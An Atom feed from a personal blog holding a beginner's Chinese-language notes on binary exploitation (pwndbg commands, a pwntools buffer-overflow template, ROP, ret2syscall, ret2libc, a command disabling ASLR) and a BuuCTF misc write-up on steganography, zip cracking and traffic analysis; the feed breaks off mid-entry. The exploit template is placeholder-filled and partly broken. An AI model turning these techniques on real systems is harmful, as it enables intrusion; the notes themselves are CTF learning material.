<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>【W】</title>
  
  
  <link href="https://0410wzn.top/atom.xml" rel="self"/>
  
  <link href="https://0410wzn.top/"/>
  <updated>2021-11-27T15:28:55.754Z</updated>
  <id>https://0410wzn.top/</id>
  
  <author>
    <name>W</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PWN学习随笔</title>
    <link href="https://0410wzn.top/2021/11/27/PWN%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/"/>
    <id>https://0410wzn.top/2021/11/27/PWN%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/</id>
    <published>2021-11-27T15:27:04.000Z</published>
    <updated>2021-11-27T15:28:55.754Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="PWN学习笔记——初稿"><a href="#PWN学习笔记——初稿" class="headerlink" title="PWN学习笔记——初稿"></a>PWN学习笔记——初稿</h1><p><strong>注明：</strong>本篇学习笔记是入门学习pwn时的随笔，所以<font color="red">不具有任何参考价值 </font>，仅作为对学习路线回顾参考的笔记以及入门纪念。</p><p>​                                    <em><strong><font size="12">人生苦短，我学PWN！</font></strong></em></p><hr><h4 id="师傅，师傅，我该怎么入门？-🐉"><a href="#师傅，师傅，我该怎么入门？-🐉" class="headerlink" title="***师傅，师傅，我该怎么入门？***🐉"></a>***<font size="4">师傅，师傅，我该怎么入门？</font>***🐉</h4><p><em><strong><del><font size="5">不用担心，使用 Kali Linux ， 称霸局域网 ！[doge]</font></del></strong></em>    (我用的kali😥)               <img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/kali!.jpg" alt="kali!"></p><hr><h4 id="来堪堪函数调用的栈？"><a href="#来堪堪函数调用的栈？" class="headerlink" title="来堪堪函数调用的栈？"></a><em><strong><font size="4">来堪堪函数调用的栈？</font></strong></em></h4><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211127134908004.png" alt="image-20211127134908004"></p><hr><h4 id="调试，调试！"><a href="#调试，调试！" class="headerlink" title="调试，调试！"></a><em><strong><font size="4">调试，调试！</font></strong></em></h4><p><font color="red">Ida中的静态调试显示的函数和输出之间的距离，有时候会因为各种原因😁而显示错误，需要用pwndbg动态调试观察一下。<del>淦，gdb显示的地址有时候也不对</del></font></p><p><em><strong><font size="4">IDA基本操作</font></strong></em> (静态调试)</p><p>shift + F12</p><p>space</p><p>F5</p><p><del>ctrl + F</del></p><p>***<font size="4">Pwndbg基本操作</font>***（动态调试）</p><p>Pwndbg + 文件名                                     <font color="blue"> 进入对某个文件的调试</font></p><p>r                                                                   <font color="blue">运行</font></p><p>b + 地址/函数                                            <font color="blue"> 设置断点</font></p><p>checksec + 文件名                                   <font color="blue"> 查看保护措施</font></p><p>stack + 数字                                              <font color="blue"> 查看栈段</font></p><p>vmmap’                                                     <font color="blue">显示虚拟内存的的空间分布(观察读写的权</font>                                                                    <font color="blue">限是否有冲突-w与x不同时出现</font></p><p>plt                                                               <font color="blue">查看文件里的plt表项</font></p><p>x + 地址                                                     <font color="blue">显示该地址的内容和地址</font></p><p>got                                                             <font color="blue">查看got中保存的函数数量及其字节、数据等信息</font></p><p>disass + 地址                                            <font color="blue">反汇编地址的数据，进而查看其汇编代码或plt</font></p><p>c                                                                 <font color="blue">继续执行程序，直到遇到断点/程序中断</font></p><p>start                                                           <font color="blue">开始执行程序，会停到main函数；如果没有main函数，则会停到程</font>                                                                   <font color="blue">序的入口</font></p><p>s                                                                  <font color="blue">附近</font></p><p>backtrace                                                  <font color="blue">显示函数调用栈段的状态</font></p><p>return                                                        <font color="blue">快速回到mian函数</font></p><hr><h4 id="求求了，用用py吧-🐶"><a href="#求求了，用用py吧-🐶" class="headerlink" title="求求了，用用py吧 🐶"></a><em><strong><font size="4">求求了，用用py吧</font></strong></em> 🐶</h4><p>(context.arch = “amd64”)                       <font color="blue"> 调整攻击环境 </font></p><p>shellcode.sh()</p><p>print(xxx)                                                 <font color="blue"> 更清楚地查看shellcode</font></p><p>print(asm(xxx))                                       <font color="blue"> 查看shellcode的机器码</font></p><p><font size="4" color="red">获取shellcode :   1.shellstore  2.pwntools – shellcraft.sh() (后面就是方法) </font> </p><p>print(asm(shellcode.(amd64.)sh())) </p><p>elf.got()                                                      <font color="blue">查看字典的索引值</font></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211127161615493.png" alt="image-20211127161615493"></p><p>64位👆</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211127162729975.png" alt="image-20211127162729975"></p><p>32位👆</p><p>上面比较短的，比如8048，就是elf文件的代码段；</p><p>以f7开头的，说明其在比较高的中间位置，大致是在libc处；</p><p>更大的，fff，就是栈的地址</p><hr><h4 id="嘿嘿嘿·🤭，脚本（介绍一下大致模板，最简单的那种啊，别误会）"><a href="#嘿嘿嘿·🤭，脚本（介绍一下大致模板，最简单的那种啊，别误会）" class="headerlink" title="嘿嘿嘿·🤭，脚本（介绍一下大致模板，最简单的那种啊，别误会）"></a><em><strong>嘿嘿嘿</strong></em>·🤭，<em><strong>脚本</strong></em>（介绍一下大致模板，最简单的那种啊，别误会）</h4><p><em><strong>vim     exp.py</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">(context.arch = &quot;amd64&quot;)</span><br><span class="line"></span><br><span class="line">io = process(&quot;本地文件路径&quot;) //与本地文件交互 </span><br><span class="line"></span><br><span class="line">OR  </span><br><span class="line"></span><br><span class="line">io = remote(&quot;IP&quot;, 端口 )</span><br><span class="line"></span><br><span class="line">io.recvline()  //接受程序给的文件</span><br><span class="line"></span><br><span class="line">payload = b&#x27;”x”(字节型的数据) + p32(劫持程序的地址) //将一个整数的地址转化成字节型的数据  32位的ebp占4个字节，64位的·ebp占8个字节</span><br><span class="line">io.send(payload) //发送数据   </span><br><span class="line"></span><br><span class="line">OR  </span><br><span class="line"></span><br><span class="line">io.sendline(payload) //发送一行数据，相当于在数据末尾加/n;</span><br><span class="line"></span><br><span class="line">io.interactive()   //交互 </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">(context.arch = &quot;amd64&quot;)</span><br><span class="line"></span><br><span class="line">io = process(&quot;本地文件路径&quot;)  //与本地文件交互 </span><br><span class="line"></span><br><span class="line">OR  </span><br><span class="line"></span><br><span class="line">io = remote(&quot;IP&quot;, 端口 )</span><br><span class="line"></span><br><span class="line">io.recvline()   //接受程序给的文件</span><br><span class="line"></span><br><span class="line">asm(shellcode.(amd64.)sh())  //获取shellcode的机器码    </span><br><span class="line"></span><br><span class="line">payload = asm( shellcode.(amd64.)sh()),lhust( 112， b’A ) /*补充字节流（这里就是A ）到112 */ + p32( 劫持程序的地址(可以是全局变量的地址) )</span><br><span class="line"></span><br><span class="line">io.send(payload) //发送数据   </span><br><span class="line"></span><br><span class="line">OR  </span><br><span class="line"></span><br><span class="line">io.sendline(payload) //发送一行数据，相当于在数据末尾加/n;</span><br><span class="line"></span><br><span class="line">io.interactive()   //交互 </span><br></pre></td></tr></table></figure><p>还有很多呐！</p><hr><h4 id="呐，shellcode注意啥啊"><a href="#呐，shellcode注意啥啊" class="headerlink" title="呐，shellcode注意啥啊"></a><em><strong><font size="4">呐，shellcode注意啥啊</font></strong></em></h4><p> bss默认可执行，因此我们可以通过全局变量向其输入shellcode</p><p>gets 漏洞</p><p>未初始化的全局变量保存在bss里</p><hr><h4 id="不会算数，py来救"><a href="#不会算数，py来救" class="headerlink" title="不会算数，py来救"></a><em><strong><font size="4">不会算数，py来救</font></strong></em></h4><p>使用python计算栈段之间的距离</p><p>0x….(高地址) – 0x…(低地址)</p><p>&gt;&gt;&gt;十进制数</p><p>Hex(十进制)</p><p>&gt;&gt;&gt;十六进制 </p><hr><h4 id="保护措施-🛡"><a href="#保护措施-🛡" class="headerlink" title="保护措施     🛡"></a><em><strong><font size="4" color="green">保护措施</font></strong></em>     🛡</h4><p>1-NX                               <font color="red">栈不可执行</font></p><p>2-ASLR                           <font color="red">让函数的栈、共享连接库、堆段进行地址随机化，</font></p><p>​                                        <font color="blue">0 – 未打开；1 – 部分随机化；2 – 全部随机化</font></p><p>​                                        <font color="orange">关闭ASLR  – “echo 0 &gt; /proc/sys/kernel/randomize_va_space”</font></p><p>3-Canary（金丝雀）   <font color="red">在调用一个函数，刚创建栈帧时，首先把一个值（canary）放在低地址空间里，在销毁</font>                                      <font color="red">函数时，先检查这个值（canary）是否发生改变，如果值改变，就会其强行将程序退出</font></p><p>4-Pie                               <font color="red">编译时打开开关，随机化elf文件映像（text，bss。data）</font> </p><hr><h4 id="程序进不去怎么办-😱"><a href="#程序进不去怎么办-😱" class="headerlink" title="***程序进不去怎么办***😱"></a>***<font size="4">程序进不去怎么办</font>***😱</h4><p><strong>修改文件权限</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">gcc -fno-stack-protector -z execstack -no-pie -g -o re2stack ret2stack.c</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>-fno-stack-protector                  <font color="blue">关闭canary，使栈溢出首先可行</font></p><p>-z execstack                               <font color="blue"> 打开栈的可执行权限</font></p><p>-no-pie                                        <font color="blue">  关闭pie</font></p><p>-g                                                 <font color="blue"> 带上调试信息，便于观看（一定要带着re2stack.c）</font></p><p>-o                                                 <font color="blue"> 输出文件名</font></p><hr><h4 id="请问字节是啥-🤐"><a href="#请问字节是啥-🤐" class="headerlink" title="***请问字节是啥***🤐"></a>***<font size="4">请问字节是啥</font>***🤐</h4><p>8比特 – 1 字节</p><p>每4比特可以直接写成一个16进制的值，</p><p>每两个16进制数就是1个字节</p><hr><h4 id="ROP！！！"><a href="#ROP！！！" class="headerlink" title="ROP！！！"></a><em><strong><font size="4">ROP！！！</font></strong></em></h4><p>没有连续的代码，但是通过一段一段的这个函数中包含的代码片段，达到相同的执行效果，即模拟程序的执行</p><p>其中<strong>思想的不同</strong>:没有一步到位的地址一次覆盖到tet，调用shell（即调用shell攻击目标，无法通过一个地址一次，所以需要，自己将程序中的指令组合起来，起到shell的作用）</p><p>我们所需要的为eaxebx…赋值的代码本来就存在，但是不连续，我们需要把他们组成一个链式结构（gadget），所以需要溢出很长的一段数据，把这些调成想要的格式，使其能够连续工作，并使其最后一条指令为ret。</p><p>对于系统调用，要在所有以ret结尾的代码中，找出个代码片段，它们的作用分别是pop eax、pop ebx、pop ecx、pop edx，pop一个寄存器的指令可以将数值直接写到栈上</p><p>PS：**系统调用 **—— 本质上只是一段函数，X86使用中断进行系统调用，第一个栈帧是main函数的栈帧，在main函数之前执行的所有函数都是没有栈帧的</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/ret2syscall.png"></p><hr><h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a><em><strong><font size="5" color="purple">ret2syscall</font></strong></em></h4><p>  <font color="red">因为需要执行大量代码段，故通过局部变量溢出， 组合一些gadget执行大量的代码片段，故将从ret开始的一大段栈空间，覆盖成gadget地址和对应的参数，此时，在main函数返回时，就会返回到已经被覆盖掉的，现在是ret的地址， 并执行指令</font></p><p>（ret把当前栈顶的值pop到eip）ret等效于pop eip</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/ROP.png" alt="ROP" style="zoom: 80%;">  <div align="center"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/ROP1.png" alt="ROP1" style="zoom: 50%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/onegadget.png" style="zoom: 55%;"></div><p>get ­­­­­­­­­­­­­­­­­­­­–binary <font color="green">文件名</font> – only “ pop | ret <font color="green">要寻找的指令</font>|<font color="green">管道符</font> grep xx  <font color="green">把输入参数中含有xx的命令显示出来</font></p><p>Ret = pop xxx            <font color="green">即把xxx弹出到eip </font></p><p>Xor                              <font color="green">清空寄存器</font></p><p><strong><font color="pink">下面是示例！</font></strong></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/ret2syscall01.png" alt="ret2syscall02"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/ret2syscall02.png" alt="ret2syscall01"></p><p>Int 0x80 （ eax = 0xb , ebx = …, ecx = 0,edx = 0 ）进行系统调用（ int – 中断指令 ），通过寄存器传参，来确定要调用哪一个函数。在执行int 0x80 这个汇编代码对应的机器码时，要确保四个寄存器都已经存储了对应的函数所需要的参数，即0xb这一个系统调用号对应的sys_execve() 对应的内核里的函数的调用号，而0xb 在这里·也带代表了那个函数</p><p><font color="pink"><strong>下面使用pwntools便捷获取/bin/sh的地址</strong></font></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/pwntools.png" alt="pwntools"></p><p>使用next传入生成器</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/pwntools1.png" alt="pwntools1" style="zoom:50%;"><p>最后一层是要输入的垃圾数据，倒数第三行是要给</p><p>倒数第二层输入的数据，以此类推</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/ret2ssystem.png" alt="ret2ssystem" style="zoom:50%;"><hr><h4 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接 "></a><em><strong><font size="5">动态链接 </font></strong></em></h4><p>当我们使用file命令去查看一些文件的属性时，下面两点也会被显示出来：</p><p><strong><font size="4">动态链接：gcc -fno-pie -o dytest xxx.py                       dynamically link</font></strong></p><p><strong><font size="4">静态链接：gcc -fno-poe –static -o statest xxx.py          statically link</font></strong></p><p>本块主要讨论动态链接</p><p><strong><font color="red" size="4">动态链接相关结构</font></strong></p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E7%BB%93%E6%9E%84.png" alt="动态链接结构" style="zoom:67%;"><p>dynamic section                         <font color="blue">为操作系统描述了整个动态链接的完整内容</font></p><p>​                                                      <font color="blue">提供动态链接相关信息</font></p><p> link_map                                     <font color="blue">保存进程载入的动态链接库的链表</font></p><p> dl_runtime_resolve                   <font color="blue">解析第一次在动态链接的函数的真实地址</font></p><p>​                                                      <font color="blue">装载器中用于解析动态链接库中函数的实际地址的函数</font></p><p> got                                              <font color="blue"> 全局的符号、变量地址</font></p><p> got.plt                                         <font color="blue">全局的函数地址</font></p><p>动态占用内存小（其库函数占用少）</p><p><strong><font color="red" size="4">动态链接过程</font></strong></p><p>ldd 文件名                    查看文件用到的所有动态链接库</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.png" alt="动态链接"></p><p><strong>下面分流程分析</strong></p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/%E8%BF%87%E7%A8%8B1.png" alt="过程1" style="zoom: 50%;"><p>text —— 代码节；foo@olt —— foo是自己写的函数；plt是代码段中存放函数真实地址的一个节； PLT0（PLT最开始的两段指令）</p><p>因为foo是个动态链接库中的代码，所以call foo，并不能直接跳转到它自己代码段里的foo函数，只能去代码段中的plt节，而每个被调用的动态链接库中的函数都会在其中创立一个表项，</p><p>1、call foo@plt                      <font color="blue">进程首次调用 foo</font></p><p>2、jmp *(foo@GOT)             <font color="blue">跳转到 .plt 中的 foo 表项，plt 中的代码立即跳转到.got.plt 中记录的地址</font></p><p>3、push                                  <font color="blue">由于进程是第一次调用 foo，故.got.plt 中记录的地址是 foo@plt+1</font></p><p>4、jmp                                    <font color="blue">回到 .plt 是，解析 foo 的实际地址</font></p><p>5、push *(GOT+4)                <font color="blue">跳转到 .plt 头部，为 dl_runtime_resolve 函数传参</font></p><p>6、push *(GOT+4)                <font color="blue">跳转到 .plt 头部，为 dl_runtime_resolve 函数传参</font></p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/%E8%BF%87%E7%A8%8B2.png" alt="过程2" style="zoom: 50%;"><p>7、call_fix_up                       <font color="blue">dl_runtime_resolve 函数解析 foo 的真正地址填入 .got.plt 中</font></p><p>8、ret 0xc                             <font color="blue">此后 .got.plt 中保存的是 foo 的真实地址</font></p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/%E8%BF%87%E7%A8%8B3.png" alt="过程3" style="zoom: 50%;"><p>9、call foo@plt                  <font color="blue">系统第二次调用foo</font></p><p>10、jum *(foo@GOT)      <font color="blue"> 直接自 .got.plt 跳转到 foo 的真实地址，没有了第一次的解析地址过程</font></p><p>ok，接下来展示<strong>完整流程</strong></p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/%E5%AE%8C%E6%95%B4.png" alt="完整" style="zoom:50%;"><hr><h4 id="IDA的细节"><a href="#IDA的细节" class="headerlink" title="IDA的细节"></a><em><strong><font size="5">IDA的细节</font></strong></em></h4><p>init                    <font color="blue">用作初始化的一个节，记录了初始化代码</font></p><p>plt                     <font color="blue">存放函数真实地址的一个节</font></p><p>got                    <font color="blue">存放数据的节</font></p><hr><h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a><em><strong><font size="5" color="purple">ret2libc</font></strong></em></h4><p>往往依赖于rop所需要的各种gadget创造执行shellcode的环境，但其目标是返回libc里的system函数这一类可以为我们提供一个shell的函数</p><hr><h4 id="进程虚拟地址空间"><a href="#进程虚拟地址空间" class="headerlink" title="进程虚拟地址空间"></a><em><strong><font size="5">进程虚拟地址空间</font></strong></em></h4><p>地址以字节编码        1Byte = 8bits</p><p>常以16进制表示        0x3c = 00111100</p><p>虚拟内存用户空间每个进程一份</p><p>虚拟内存内核空间所有进程共享一份</p><p>虚拟内存mmap段中的动态链接库仅在物理内存中装载一份</p><hr><p>PIE</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="人生苦短，我学pwn" scheme="https://0410wzn.top/tags/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E5%AD%A6pwn/"/>
    
  </entry>
  
  <entry>
    <title>BuuCTF杂项WP</title>
    <link href="https://0410wzn.top/2021/11/25/BuuCTF%E6%9D%82%E9%A1%B9WP/"/>
    <id>https://0410wzn.top/2021/11/25/BuuCTF%E6%9D%82%E9%A1%B9WP/</id>
    <published>2021-11-25T15:45:41.000Z</published>
    <updated>2021-12-06T16:43:32.052Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="BuuCTF杂项WP"><a href="#BuuCTF杂项WP" class="headerlink" title="BuuCTF杂项WP"></a>BuuCTF杂项WP</h1><blockquote><p><a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p></blockquote><h3 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h3><p>下载附件如下：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/aaa.gif"></p><p>仔细看，会发现有几帧明显有猫腻，果断stegsolve，发现如下几帧：</p><div align="center"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-25 (8).png" style="zoom: 70%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26.png" style="zoom: 70%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26 (1).png" style="zoom: 70%;"></div>答案显而易见对吧！<h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><p>下载附件如下：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/QR_code.png"></p><p>别怕，扫描一下：</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26%20(4).png" style="zoom:33%;"><p>很明显，flag似乎就在二维码里，但不能被直接扫描出来，这条路走不通，我们就换条路，从图像本身进行分析</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/Quicker_20211126_001734.png" style="zoom:50%;"><p>果然有东西！binwalk提取，发现是一个文件夹，里面是一个需要密码的压缩包，旁边是一个文本文档，名叫”4number“，提示很明显了——四位数字爆破</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126004943690.png" alt="image-20211126004943690"></p><p>解压，拿到flag！</p><h3 id="你竟然赶我走！"><a href="#你竟然赶我走！" class="headerlink" title="你竟然赶我走！"></a>你竟然赶我走！</h3><p>hahaha，看看附件：</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/biubiu.jpg" style="zoom:50%;"><p>没啥可说的，010或者hex一看有惊喜</p><h3 id="有N种方法解决"><a href="#有N种方法解决" class="headerlink" title="有N种方法解决"></a>有N种方法解决</h3><p>呐，这个附件打不开！！！—— 用010堪堪罢，惊喜出现</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26%20(5).png"></p><p>编码开始的地方似乎是让我们把这些base64编码转成图像，说干就干！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126010508963.png" alt="image-20211126010508963"></p><p>扫一扫，得到答案！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126010624861.png" alt="image-20211126010624861" style="zoom:33%;"><h3 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h3><p>下载附件如图：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126011348020.png" alt="image-20211126011348020"></p><p>又时候，题干很重要，”看不到图？是不是屏幕太小了“——图片的长宽或许有问题！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126012245141.png" alt="image-20211126012245141" style="zoom:33%;"><p>根据这个，我们通过010调整宽高，成功获得完整图片，你说flag在哪里呐😍</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126012749979.png" alt="image-20211126012749979" style="zoom:50%;"><h4 id="干货"><a href="#干货" class="headerlink" title="干货:"></a><font color="red" size="5"><strong>干货:</strong></font></h4><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126012915721.png" alt="image-20211126012915721" style="zoom:50%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126013036241.png" alt="image-20211126013036241" style="zoom:67%;"><h3 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h3><p>emmm…都提示暴力破解了，那就乖乖暴力破解吧。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126014055933.png" alt="image-20211126014055933" style="zoom: 50%;"><p>嘿嘿嘿🤭，爆破出来了！</p><p>解压文件，得到一段base64编码，转换即有flag！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126014623349.png" alt="image-20211126014623349" style="zoom: 33%;"><h3 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h3><p>图片里有啥信息？没啥好吧，010或者hex一看就ok</p><h3 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h3><p>emmm…不是我不想写，而是没啥可写，球球你康康属性吧。。。</p><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>lsb嘛，stegsolve康一康，发现以下三幅图I里都有一些竖形：</p><div align="center"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26 (9).png" style="zoom: 70%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26 (10).png" style="zoom: 70%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26 (11).png" style="zoom: 70%;"></div><p>Data Extract</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26%20(12).png" style="zoom:50%;"><p>提示了PNG，我们将其save bin为PNG图片，得到二维码，扫描即可</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/1.png"></p><h3 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a><font color="blue">Wireshark</font></h3><p>分析流量包，自然是使用wireshark了！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126224306932.png" alt="image-20211126224306932" style="zoom: 80%;"><p>emmm…该看啥啊？</p><h4 id="划重点"><a href="#划重点" class="headerlink" title="划重点"></a><font color="red"><strong>划重点</strong></font></h4><p>经过查询之后，了解到了题目中“黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案)”给了不止一个提示——<font color="red"><strong>登录用到的请求方式是POST或GET，一般网站采取POST方式（出于安全考虑），故先用POST为条件进行筛选</strong></font>筛选语句如下：</p><blockquote><p>http.request.method==POST</p></blockquote><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126224745090.png" alt="image-20211126224745090"></p><p>只有一条！追踪其TCP流即可找到password，即flag</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126224917569.png" alt="image-20211126224917569"></p><h3 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h3><p>告诉4位数字了，爆破就完了呗，拜拜</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/Quicker_20211126_190251.png"></p><h3 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a><font color="blue">zip伪加密</font></h3><h4 id="干货："><a href="#干货：" class="headerlink" title="干货："></a><font color="red" size="5"><strong>干货</strong></font>：</h4><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211127011559649.png" alt="image-20211127011559649"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211127011629241.png" alt="image-20211127011629241"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211127011701328.png" alt="image-20211127011701328"></p><p>依据上述知识点，我们打开010</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211127012016868.png" alt="image-20211127012016868"></p><p>发现前后各有1个09，伪加密木大错，都改为0000即可,之后就会发现压缩包可以加压力，里面的文件里就是flag</p><h3 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h3><p>真就是：“二维码，谁用谁知道”，拜拜~</p><h3 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h3><p>提到流量分析，自然又是wireshark！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211128141314047.png" alt="image-20211128141314047"></p><p>过滤</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211128141343330.png" alt="image-20211128141343330"></p><p>flag出来了。</p><h3 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h3><p>这个题啊，镜子里面啊，想隐写啊。<del>（010、binwalk找不出啥来才想的🐶,）</del></p><p>LSB!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-27.png" alt="2021-11-27"></p><h3 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h3><p>得到图片，010和属性都没看出啥，于是binwalk，发现图片里面存在一个压缩包，提取即可。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/binwalk.png" alt="binwalk"></p><p>提取出来，爆破即可。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/%E7%88%86%E7%A0%B4.png" alt="爆破"></p><p>里面的文档即使flag</p><h3 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" 